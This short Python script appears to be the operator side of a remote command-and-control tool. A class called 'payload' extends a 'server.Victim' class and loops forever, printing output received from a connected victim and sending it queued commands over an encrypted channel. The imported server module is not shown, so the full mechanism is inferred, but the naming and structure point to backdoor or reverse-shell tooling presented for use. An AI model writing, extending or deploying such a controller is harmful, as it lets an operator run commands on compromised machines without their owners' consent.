#!/usr/bin/env python3
import server; 
import sys
import functools

print = functools.partial(print, flush=True)
class payload(server.Victim):
    def run(self):
       while True:
            print(str(self.secure_recv().decode()))
            command = str(self.getCommandFromQueue())
            print(command)
            self.secure_send(command.encode(),len(command.encode()))
if __name__ == "__main__":
    server.run(payload)
